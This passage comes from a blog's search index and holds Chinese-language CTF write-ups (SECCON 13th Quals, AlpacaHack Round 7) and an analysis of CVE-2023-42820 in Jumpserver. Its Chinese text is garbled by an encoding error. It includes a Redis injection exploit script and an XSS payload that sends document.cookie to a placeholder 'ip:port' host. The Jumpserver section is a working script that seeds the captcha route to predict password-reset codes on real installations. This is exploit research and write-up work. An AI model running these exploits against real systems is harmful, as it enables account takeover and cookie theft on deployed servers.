res.status(400).send(`Bad URL: ${req.url}`); return; } next(); }); app.use(express.static(\u0026#34;public\u0026#34;)); flagæ–‡ä»¶åç”Ÿæˆï¼š\nFLAG_PATH=./public/$(md5sum flag.txt | cut -c-32 | fold -w1 | paste -sd /)/f/l/a/g/./t/x/t å¯¹äºexpressæ¥è¯´ï¼Œè®¿é—®é™æ€æ–‡ä»¶æ—¶ï¼Œå½“æŸä¸ªæ–‡ä»¶å¤¹å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨åŠ ä¸Š/ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœ/public/cæ–‡ä»¶å¤¹å­˜åœ¨ï¼š\nGET /c -\u0026gt; 301 location: /c/ å¹¶ä¸”å…è®¸urlç¼–ç ã€‚æ‰€ä»¥å¯ä»¥ä¸€å±‚å±‚çˆ†ç ´å‡ºæ–‡ä»¶åã€‚\nAlpaca Poll flagå­˜å‚¨åœ¨redisä¸­ã€‚\nå…³é”®è·¯ç”±å¦‚ä¸‹ï¼š\napp.post(\u0026#39;/vote\u0026#39;, async (req, res) =\u0026gt; { let animal = req.body.animal || \u0026#39;alpaca\u0026#39;; // animal must be a string animal = animal + \u0026#39;\u0026#39;; // no injection, please animal = animal.replace(\u0026#39;\\r\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;); try { return res.json({ [animal]: await vote(animal) }); } catch { return res.json({ error: \u0026#39;something wrong\u0026#39; }); } }); app.get(\u0026#39;/votes\u0026#39;, async (req, res) =\u0026gt; { return res.json(await getVotes()); }); redisç›¸å…³ä»£ç ï¼š\nimport net from \u0026#39;node:net\u0026#39;; function connect() { return new Promise(resolve =\u0026gt; { const socket = net.connect(\u0026#39;6379\u0026#39;, \u0026#39;localhost\u0026#39;, () =\u0026gt; { resolve(socket); }); }); } function send(socket, data) { console.info(\u0026#39;[send]\u0026#39;, JSON.stringify(data)); socket.write(data); return new Promise(resolve =\u0026gt; { socket.on(\u0026#39;data\u0026#39;, data =\u0026gt; { console.info(\u0026#39;[recv]\u0026#39;, JSON.stringify(data.toString())); resolve(data.toString()); }) }); } export async function vote(animal) { const socket = await connect(); const message = `INCR ${animal}\\r\\n`; const reply = await send(socket, message); socket.destroy(); return parseInt(reply.match(/:(\\d+)/)[1], 10); // the format of response is like `:23`, so this extracts only the number } const ANIMALS = [\u0026#39;dog\u0026#39;, \u0026#39;cat\u0026#39;, \u0026#39;alpaca\u0026#39;]; export async function getVotes() { const socket = await connect(); let message = \u0026#39;\u0026#39;; for (const animal of ANIMALS) { message += `GET ${animal}\\r\\n`; } const reply = await send(socket, message); socket.destroy(); let result = {}; for (const [index, match] of Object.entries([...reply.matchAll(/\\$\\d+\\r\\n(\\d+)/g)])) { result[ANIMALS[index]] = parseInt(match[1], 10); } return result; } export async function init(flag) { const socket = await connect(); let message = \u0026#39;\u0026#39;; for (const animal of ANIMALS) { const votes = animal === \u0026#39;alpaca\u0026#39; ? 10000 : Math.random() * 100 | 0; message += `SET ${animal} ${votes}\\r\\n`; } message += `SET flag ${flag}\\r\\n`; // please exfiltrate this await send(socket, message); socket.destroy(); } voteå‡½æ•°å­˜åœ¨æ³¨å…¥ã€‚ä½†getVotesåªèƒ½è§£ææ•°å­—ï¼š\nlet result = {}; for (const [index, match] of Object.entries([...reply.matchAll(/\\$\\d+\\r\\n(\\d+)/g)])) { result[ANIMALS[index]] = parseInt(match[1], 10); } return result; æŸ¥äº†æŸ¥æ–‡æ¡£å‘ç°redis stringå¯ä»¥è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œhttps://redis.io/docs/latest/commands/bitop/\næ€è·¯å°±æ˜¯å…ˆé€šè¿‡å¼‚æˆ–å°†flagç¬¬ä¸€ä¸ªå­—ç¬¦è½¬ä¸ºæ•°å­—ï¼Œç„¶åå°±èƒ½æˆåŠŸé€šè¿‡getVotesè·å¾—å›æ˜¾ï¼Œå†å¼‚æˆ–ä¸€æ¬¡å°±èƒ½è·å¾—ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åå†å°†flagç¬¬äºŒä¸ªå­—ç¬¦ä¹Ÿå¼‚æˆ–æˆæ•°å­—ï¼Œä»¥æ­¤ç±»æ¨ã€‚\nå¤åˆ¶flag\ncopy flag flagcopy å¼‚æˆ–å¹¶å¤åˆ¶åˆ°animal\ndel alpaca\rset xorstr \u0026#34;xxx\u0026#34;\rBITOP XOR alpaca flagcopy xorstr æ£€æŸ¥æ˜¯å¦æœ‰æ•°å­— /votesæŸ¥çœ‹ç¬¬ä¸‰ä¸ªæ•°å­—æ˜¯å¦æˆåŠŸè§£æï¼Œå¦‚æœæœ‰ï¼Œä¿å­˜ä¸‹æ¥ä¸å‘é€çš„xorstrå¼‚æˆ–è·å¾—flag\nä½†æ˜¯æœ‰ä¸ªå‘ï¼Œä¼¼ä¹æ•°å­—å¤ªå¤§ä¼šæº¢å‡ºï¼Œæ‰€ä»¥flagåé¢ä¸€æ®µå¾—ä¸åˆ°ã€‚\næ”¹è¿›ä»¥ä¸‹æµç¨‹ï¼Œå‡è®¾å·²ç»ç¡®å®šçš„flagéƒ¨åˆ†ï¼šflag{abcdï¼Œå¯¹åº”çš„xoråçš„æ•°å­—ä¸º123456789ï¼Œå¯¹åº”çš„xorsträ¸ºqwertyuioï¼Œæ­¤æ—¶'qwertyuio' ^ 'flag{abcd' = '123456789'ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºä¸€ä¸ªæ–°çš„xorsträ½¿å¾—new_xorstr ^ 'flag{abcd' = '000000000'ã€‚\næ­¤æ—¶æˆ‘ä»¬å†å°è¯•çˆ†ç ´ç¬¬åä¸ªå­—ç¬¦ï¼Œæ­¤æ—¶0000000001ä¼šè§£æä¸º1ï¼Œä¸ä¼šå†æº¢å‡ºäº†ã€‚\nexp:\nimport requests import string import json url = \u0026#39;http://\u0026#39; cha = string.ascii_letters + string.digits copy_flag_payload = \u0026#39;dog\\r\\n\\r\\ncopy flag flagcopy\u0026#39; fuzz_flag_payload = \u0026#39;dog\\r\\n\\r\\ndel alpaca\\r\\nset xorstr \u0026#34;{}\u0026#34;\\r\\nBITOP XOR alpaca flagcopy xorstr\\r\\nget alpaca\u0026#39; def check_votes(): res = requests.get(url=url + \u0026#39;/votes\u0026#39;) res = json.loads(res.text) if \u0026#39;alpaca\u0026#39; in res: return str(res[\u0026#39;alpaca\u0026#39;]) return None def fuzz_flag(): data = { \u0026#34;animal\u0026#34; : copy_flag_payload } requests.post(url=url + \u0026#39;/vote\u0026#39;, data=data) xored_flag = \u0026#39;\u0026#39; flag = \u0026#39;\u0026#39; while True: if len(flag) \u0026gt; 0 and \u0026#39;}\u0026#39; in flag: break for i in cha: print(xored_flag + i, end=\u0026#39;\\r\u0026#39;) data = { \u0026#34;animal\u0026#34; : fuzz_flag_payload.format(xored_flag + i) } requests.post(url=url + \u0026#39;/vote\u0026#39;, data=data) xored_char = check_votes() if xored_char == None: continue elif len(xored_char) \u0026lt; 1 or xored_char == \u0026#39;0\u0026#39;: continue xor_char = str(xored_char)[0] flag = flag + chr(ord(xor_char) ^ ord(i)) xored_flag = xored_flag + chr(ord(flag[-1]) ^ ord(\u0026#39;0\u0026#39;)) print(flag) print(xored_flag) break print(flag) fuzz_flag() å¯èƒ½æ˜¯å› ä¸ºåæ–œæ çš„åŸå› ï¼Œflagä¸­å¤šäº†ä¸€ä¸ªl\nminimal-waf xssé¢˜\nflagåœ¨bot cookieä¸­ï¼Œhttponlyä¸ºfalseã€‚å¯ä»¥æ§åˆ¶botè®¿é—®ä»»æ„urlã€‚\nexpressä»£ç å¦‚ä¸‹ï¼š\nexpress() .get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; res.type(\u0026#34;html\u0026#34;).send(indexHtml)) .get(\u0026#34;/view\u0026#34;, (req, res) =\u0026gt; { const html = String(req.query.html ?? \u0026#34;?\u0026#34;).slice(0, 1024); if ( req.header(\u0026#34;Sec-Fetch-Site\u0026#34;) === \u0026#34;same-origin\u0026#34; \u0026amp;\u0026amp; req.header(\u0026#34;Sec-Fetch-Dest\u0026#34;) !== \u0026#34;document\u0026#34; ) { // XSS detection is unnecessary because it is definitely impossible for this request to trigger an XSS attack. res.type(\u0026#34;html\u0026#34;).send(html); return; } if (/script|src|on|html|data|\u0026amp;/i.test(html)) { res.type(\u0026#34;text\u0026#34;).send(`XSS Detected: ${html}`); } else { res.type(\u0026#34;html\u0026#34;).send(html); } }) .listen(3000); ç›´æ¥é€šè¿‡urlè®¿é—®Sec-Fetch-Destæ—¶documentã€‚é€šè¿‡htmlæ ‡ç­¾è®¿é—®å³å¯ã€‚\næ€è·¯æ˜¯å…ˆç›´æ¥è®¿é—®/viewï¼Œå†é€šè¿‡iframeæˆ–embedåŒæºåµŒå…¥/viewé¡µé¢ï¼Œæ­¤æ—¶æ— wafé™åˆ¶ï¼Œå¯ä»¥è§¦å‘xssã€‚\n\u0026lt;embed code=\u0026#34;http://localhost:3000/view?html=\u0026#34; type=\u0026#34;text/html\u0026#34;\u0026gt; htmlä¸­å±æ€§ä¼šè‡ªåŠ¨å»é™¤éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œä½¿ç”¨æ¢è¡Œç»•è¿‡å³å¯ã€‚\npayloadï¼š\n%3Cembed%20code%3D%22%2Fview%3Fht%0Aml%3D%253Cscr%0Aipt%253Efetch%2528%2527http%253A%252F%252Fip%253Aport%252F%253Fflag%253D%2527%2520%252B%2520encodeURI%2528document%252Ecookie%2529%2529%253B%253C%252Fscr%0Aipt%253E%22%20type%3Dtext%2Fht%0Aml%3E ","permalink":"https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-seccon_ctf_13th_quals-alpacahack_round_7/","summary":"SECCON CTF 13th Quals Trillion_Bank é¢˜ç›®ä»£ç ï¼š\nimport fastify from \u0026#34;fastify\u0026#34;; import crypto from \u0026#34;node:crypto\u0026#34;; import fs from \u0026#34;node:fs/promises\u0026#34;; import db from \u0026#34;./db.js\u0026#34;; const FLAG = process.env.FLAG ?? console.log(\u0026#34;No flag\u0026#34;) ?? process.exit(1); const TRILLION = 1_000_000_000_000; const app = fastify(); app.register(await import(\u0026#34;@fastify/jwt\u0026#34;), { secret: crypto.randomBytes(32), cookie: { cookieName: \u0026#34;session\u0026#34; }, }); app.register(await import(\u0026#34;@fastify/cookie\u0026#34;)); const names = new Set(); const auth = async (req, res) =\u0026gt; { try { await req.jwtVerify(); } catch { return res.","title":"CTFè®°å½•-SECCON_CTF_13th_Quals, AlpacaHack_Round_7"},{"content":"ç¯å¢ƒ Jumpserver \u0026lt;= v3.6.4ä¸­å­˜åœ¨CVE-2023-42820æ¼æ´ï¼Œå¯ä»¥é¢„æµ‹éšæœºæ•°å¯¼è‡´éªŒè¯ç é¢„æµ‹ã€‚\nç¯å¢ƒæ­å»º\nvulnhubæˆ–è€…å®˜ç½‘\næ¼æ´åˆ†æ github diffå¦‚ä¸‹https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac0\nrandom_stringå‡½æ•°ç”¨äºç”Ÿæˆå¯†ç é‡ç½®çš„éªŒè¯ç ï¼Œå»æ‰äº†randomçš„seedï¼Œæ‰€ä»¥ä»£ç ä¸­åº”è¯¥æœ‰åœ°æ–¹å¯ä»¥è®¾ç½®å¯æ§seedã€‚\njumpserver v3.6.4ä½¿ç”¨äº†django-simple-captcha v0.5.18æ¥ç”ŸæˆéªŒè¯ç ï¼Œè€Œæ­¤ç‰ˆæœ¬ä¸­åœ¨captcha_imageå‡½æ•°ä¸­è®¾ç½®äº†ç§å­ï¼Œä½†ç»“æŸåæœªå°†å…¶ç½®ç©ºã€‚\nå›¾ç‰‡éªŒè¯ç é€»è¾‘ captchaç›¸å…³è·¯ç”±å¦‚ä¸‹ï¼š\nurlpatterns = [ re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 1}, ), re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)@2/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image-2x\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 2}, ), re_path(r\u0026#34;audio/(?P\u0026lt;key\u0026gt;\\w+).wav$\u0026#34;, views.captcha_audio, name=\u0026#34;captcha-audio\u0026#34;), re_path(r\u0026#34;refresh/$\u0026#34;, views.captcha_refresh, name=\u0026#34;captcha-refresh\u0026#34;), ] éªŒè¯ç åˆ·æ–°ä»£ç ï¼š\ndef captcha_refresh(request): \u0026#34;\u0026#34;\u0026#34;Return json with new captcha for ajax refresh request\u0026#34;\u0026#34;\u0026#34; if not request.headers.get(\u0026#34;x-requested-with\u0026#34;) == \u0026#34;XMLHttpRequest\u0026#34;: raise Http404 new_key = CaptchaStore.pick() ...... @classmethod def generate_key(cls, generator=None): challenge, response = captcha_settings.get_challenge(generator)() store = cls.objects.create(challenge=challenge, response=response) return store.hashkey @classmethod def pick(cls): if not captcha_settings.CAPTCHA_GET_FROM_POOL: return cls.generate_key() def fallback(): logger.error(\u0026#34;Couldn\u0026#39;t get a captcha from pool, generating\u0026#34;) return cls.generate_key() # Pick up a random item from pool minimum_expiration = timezone.now() + datetime.timedelta( minutes=int(captcha_settings.CAPTCHA_GET_FROM_POOL_TIMEOUT) ) store = ( cls.objects.filter(expiration__gt=minimum_expiration).order_by(\u0026#34;?\u0026#34;).first() ) return (store and store.hashkey) or fallback() CAPTCHA_GET_FROM_POOLé»˜è®¤ä¸ºFalseï¼Œpické€šè¿‡get_chanllengeæŸ¥æ‰¾ç”Ÿæˆchalçš„å‡½æ•°å¹¶è°ƒç”¨\njumpserveré»˜è®¤æœ‰å¦‚ä¸‹è®¾ç½®:\nCAPTCHA_IMAGE_SIZE = (180, 38) CAPTCHA_FOREGROUND_COLOR = \u0026#39;#001100\u0026#39; CAPTCHA_NOISE_FUNCTIONS = (\u0026#39;captcha.helpers.noise_dots\u0026#39;,) CAPTCHA_CHALLENGE_FUNCT = \u0026#39;captcha.helpers.math_challenge\u0026#39; math_challengeç”¨äºç”Ÿæˆç®€å•çš„æ•°å­¦è®¡ç®—é¢˜ã€‚\ndef math_challenge(): operators = (\u0026#34;+\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;-\u0026#34;) operands = (random.randint(1, 10), random.randint(1, 10)) operator = random.choice(operators) if operands[0] \u0026lt; operands[1] and \u0026#34;-\u0026#34; == operator: operands = (operands[1], operands[0]) challenge = \u0026#34;%d%s%d\u0026#34; % (operands[0], operator, operands[1]) return ( \u0026#34;{}=\u0026#34;.format(challenge.replace(\u0026#34;*\u0026#34;, settings.CAPTCHA_MATH_CHALLENGE_OPERATOR)), str(eval(challenge)), ) éªŒè¯ç åˆ·æ–°æµç¨‹ä¸ºï¼š\né€šè¿‡math_challengeç”Ÿæˆç®€å•ç®—æœ¯é¢˜ å°†é¢˜ç›®å’Œç­”æ¡ˆä¿å­˜ é€šè¿‡store.hashkeyç”Ÿæˆé¢˜ç›®hashï¼Œå°†hashä½œä¸ºkeyè¿”å› åç»­å¯æ ¹æ®æ­¤keyè·å–å›¾ç‰‡ã€‚ç”±captcha_imageå‡½æ•°ç”Ÿæˆå›¾ç‰‡ã€‚\ncaptcha_imageä»£ç å¦‚ä¸‹ï¼š\ndef captcha_image(request, key, scale=1): if scale == 2 and not settings.CAPTCHA_2X_IMAGE: raise Http404 try: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) random.seed(key) # Do not generate different images for the same key text = store.challenge if isinstance(settings.CAPTCHA_FONT_PATH, str): fontpath = settings.CAPTCHA_FONT_PATH elif isinstance(settings.CAPTCHA_FONT_PATH, (list, tuple)): fontpath = random.choice(settings.CAPTCHA_FONT_PATH) else: raise ImproperlyConfigured( \u0026#34;settings.CAPTCHA_FONT_PATH needs to be a path to a font or list of paths to fonts\u0026#34; ) if fontpath.lower().strip().endswith(\u0026#34;ttf\u0026#34;): font = ImageFont.truetype(fontpath, settings.CAPTCHA_FONT_SIZE * scale) else: font = ImageFont.load(fontpath) if settings.CAPTCHA_IMAGE_SIZE: size = settings.CAPTCHA_IMAGE_SIZE else: size = getsize(font, text) size = (size[0] * 2, int(size[1] * 1.4)) image = makeimg(size) xpos = 2 charlist = [] for char in text: if char in settings.CAPTCHA_PUNCTUATION and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in charlist: fgimage = Image.new(\u0026#34;RGB\u0026#34;, size, settings.CAPTCHA_FOREGROUND_COLOR) charimage = Image.new(\u0026#34;L\u0026#34;, getsize(font, \u0026#34; %s \u0026#34; % char), \u0026#34;#000000\u0026#34;) chardraw = ImageDraw.Draw(charimage) chardraw.text((0, 0), \u0026#34; %s \u0026#34; % char, font=font, fill=\u0026#34;#ffffff\u0026#34;) if settings.CAPTCHA_LETTER_ROTATION: charimage = charimage.rotate( random.randrange(*settings.CAPTCHA_LETTER_ROTATION), expand=0, resample=Image.BICUBIC, ) charimage = charimage.crop(charimage.getbbox()) maskimage = Image.new(\u0026#34;L\u0026#34;, size) ...... for f in settings.noise_functions(): draw = f(draw, image) for f in settings.filter_functions(): image = f(image) ...... return response å…ˆå°†keyä½œä¸ºseedä¼ å…¥ï¼Œåç»­éœ€è¦è®¡ç®—randomæ“ä½œè°ƒç”¨äº†å¤šå°‘æ¬¡ï¼Œå§‘ä¸”ç§°å…¶ä¸ºåç§»å§ã€‚\nsettings.CAPTCHA_FONT_PATHé»˜è®¤æœ‰å€¼ï¼Œä¸ä¼šè°ƒç”¨random.choice\nä¹‹åä¼šå¯¹textä¹Ÿå°±æ˜¯ç®—æœ¯é¢˜è¿›è¡Œå¤„ç†ï¼Œä¼šè°ƒç”¨random.randrange(*settings.CAPTCHA_LETTER_ROTATION)ï¼Œè°ƒç”¨æ¬¡æ•°ä¸ç¡®å®šã€‚\nåœ¨noise_functions()ä¸­jumpserverè®¾ç½®ä¸ºäº†captcha.helpers.noise_arcså’Œcaptcha.helpers.noise_dotsï¼Œå…¶ä¸­captcha.helpers.noise_dotsä¼šè°ƒç”¨randomã€‚ä»£ç å¦‚ä¸‹ï¼š\ndef noise_dots(draw, image): size = image.size for p in range(int(size[0] * size[1] * 0.1)): draw.point( (random.randint(0, size[0]), random.randint(0, size[1])), fill=settings.CAPTCHA_FOREGROUND_COLOR, ) return draw å›¾ç‰‡å¤§å°å†³å®šseedçš„åç§»ã€‚è€Œjumpserverè®¾ç½®äº†é»˜è®¤å›¾ç‰‡å¤§å°ï¼Œå°±æ˜¯ä¸Šé¢æåˆ°çš„CAPTCHA_IMAGE_SIZE = (180, 38)ï¼Œåœ¨captcha_imageå‡½æ•°ä¸­è¯»å–å¹¶èµ‹å€¼ã€‚\nå¯†ç é‡ç½®éªŒè¯ç é€»è¾‘ UserResetPasswordSendCodeApiç±»å®šä¹‰äº†éªŒè¯ç é€»è¾‘ï¼š\ntoken = request.GET.get(\u0026#39;token\u0026#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(\u0026#39;authentication:forgot-previewing\u0026#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(\u0026#39;username\u0026#39;) form_type = serializer.validated_data[\u0026#39;form_type\u0026#39;] code = random_string(6, lower=False, upper=False) ...... æ¼æ´åˆ©ç”¨ æƒ³è¦é¢„æµ‹éªŒè¯ç è¾¾æˆä»¥ä¸‹æ¡ä»¶ï¼š\næ§åˆ¶seed å¯æ§seedçš„åç§» æ§åˆ¶seed é€šè¿‡è·¯ç”±/core/auth/captcha/image/{seed}/å³å¯è®¾ç½®seedã€‚éœ€è¦æ³¨æ„ï¼š\nç”Ÿæˆå›¾ç‰‡æ—¶ä¼šæ£€æŸ¥æ­¤keyæ˜¯å¦é€šè¿‡refreshç”Ÿæˆï¼š\ntry: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) å½“ä¸€ä¸ªéªŒè¯ç è¢«ä½¿ç”¨åï¼Œå¯¹åº”çš„keyä¼šè¢«åˆ é™¤ï¼Œå¦‚æœå†æ¬¡å°è¯•è®¾ç½®seedä¸ºæ­¤keyï¼Œä¼šè¿”å›410é”™è¯¯ï¼Œæ‰€ä»¥keyä¸èƒ½å¤ç”¨ã€‚\nè¿˜æœ‰å°±æ˜¯jumpserverä¼šæœ‰å¤šä¸ªè¿›ç¨‹è¿›è¡Œç›‘å¬ï¼Œæ‰€ä»¥éœ€è¦å¤šæ¬¡å‘åŒ…è®¾ç½®seedæ‰èƒ½ä½¿æ‰€æœ‰è¿›ç¨‹çš„seedéƒ½è¢«æ§åˆ¶ï¼Œæé«˜æˆåŠŸç‡ã€‚\nè®¡ç®—randomè°ƒç”¨æ¬¡æ•° noise_dotsè®¡ç®—å™ªç‚¹ä»¥åŠæœ€ç»ˆç”Ÿæˆcodeæ—¶è°ƒç”¨æ¬¡æ•°éƒ½æ˜¯å›ºå®šçš„ã€‚ä¸ç¡®å®šçš„åœ°æ–¹æ˜¯å¯¹challengeå¤„ç†æ—¶è°ƒç”¨æ¬¡æ•°ä¼šæ ¹æ®challengeå†…å®¹å†³å®šã€‚\nå°è¯•æšä¸¾æ‰€æœ‰å¯èƒ½ï¼š\nlens = [] for i in range(1, 11): for l in range(1, 11): for p in [\u0026#39;*\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;+\u0026#39;]: sum = 0 text = \u0026#39;{}{}{}=\u0026#39;.format(str(i), p, str(l)) charlist = [] for char in text: if char in \u0026#34;_\\\u0026#34;\u0026#39;,.;:-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in charlist: sum = sum + 1 if sum not in lens: lens.append(sum) lens.sort() print(lens) # [3, 4, 5, 6] è®¡ç®—4æ¬¡çš„æ¦‚ç‡æœ€å¤§ã€‚\nåŠè‡ªåŠ¨åˆ©ç”¨ åˆ©ç”¨æµç¨‹ï¼š\næµè§ˆå™¨è¿›å…¥å‘é€éªŒè¯ç é¡µé¢ åœ¨å‘é€éªŒè¯ç ä¹‹å‰è¿è¡Œè„šæœ¬é¢„æµ‹éªŒè¯ç  å‘é€éªŒè¯ç  åŸç†ï¼šå…ˆè®¾ç½®seedï¼Œç„¶åç”¨gen_img_flowæ¨¡æ‹Ÿseedåç§»ã€‚å› ä¸ºæ¬¡æ•°ä¸º4çš„æ¦‚ç‡æœ€å¤§ï¼Œæ‰€ä»¥å›ºå®šä¸º4ã€‚æ­¤è„šæœ¬æœ‰æ¦‚ç‡å¤±è´¥å¤§æ¦‚ä¸º30%\nè„šæœ¬å¦‚ä¸‹ï¼š\nimport requests import random import string import re url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # æ²¡æœ‰åŒ…å«æŒ‡å®šçš„å­—ç¬¦, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # é¦–ä½ä¸èƒ½ä¸ºç‰¹æ®Šå­—ç¬¦, retry continue else: # æ»¡è¶³è¦æ±‚ç»ˆæ­¢ while å¾ªç¯ break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) except: pass if __name__ == \u0026#39;__main__\u0026#39;: s = requests.Session() key = None set_seed(s) random.seed(key) gen_img_flow(4) code = random_string(6, lower=False, upper=False) print(code) æå‡æˆåŠŸæ¦‚ç‡çš„å°è¯• ä¸Šé¢çš„è„šæœ¬æœ‰æ¦‚ç‡å¤±è´¥æ˜¯å› ä¸ºï¼Œseedåç§»ä¸ç¡®å®šã€‚è¦æå‡æˆåŠŸç‡è¦ä»æ­¤å…¥æ‰‹ã€‚\nå¦‚ä¸‹å›¾ï¼š éœ€è¦è·å–åŸæœ¬seedçš„å€¼æˆ–è€…chal\næ€è·¯ä¸€ è®¾ç½®ä¸¤æ¬¡seed(ä¸å¯è¡Œ) å¯ä»¥å…ˆè®¾ç½®seed1ï¼Œå†è®¾ç½®seed2ï¼Œè¿™æ ·chalç”±seed1ç”Ÿæˆï¼Œcodeç”±seed2ç”Ÿæˆã€‚\nçœ‹ä¼¼å¾ˆåˆç†ï¼Œä½†å…¶å®ä¸å¯è¡Œï¼Œå› ä¸ºå¦‚æœè¦é€šè¿‡seed1è®¡ç®—chalï¼Œéœ€è¦çŸ¥é“seed1çš„åç§»ï¼Œè¿™å°±åˆå˜æˆè¦è·å–åœ¨seed1ä¹‹å‰çš„é‚£ä¸ªæœªçŸ¥chaläº†ã€‚\nå¦‚å›¾æ‰€ç¤ºï¼š æ€è·¯äºŒ chalè¾…åŠ©è®¡ç®—(å¯è¡Œ) åœ¨è®¾ç½®seedä¹‹åï¼ŒæŸ¥çœ‹ç”Ÿæˆçš„chalï¼Œæ‰‹åŠ¨è¾“å…¥chalè¾…åŠ©è®¡ç®—ã€‚\nå¦‚å›¾ï¼š è™½è¯´100%å‡†ç¡®ï¼Œä½†å¾ˆéº»çƒ¦ï¼Œä¸ç”¨chalè¾…åŠ©æ­£ç¡®ç‡ä¹Ÿèƒ½æœ‰60%ä»¥ä¸Šäº†ï¼Œæ„ä¹‰ä¸å¤§ã€‚\nimport requests import random import string import re import PIL url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # æ²¡æœ‰åŒ…å«æŒ‡å®šçš„å­—ç¬¦, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # é¦–ä½ä¸èƒ½ä¸ºç‰¹æ®Šå­—ç¬¦, retry continue else: # æ»¡è¶³è¦æ±‚ç»ˆæ­¢ while å¾ªç¯ break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) if i == 0: f = 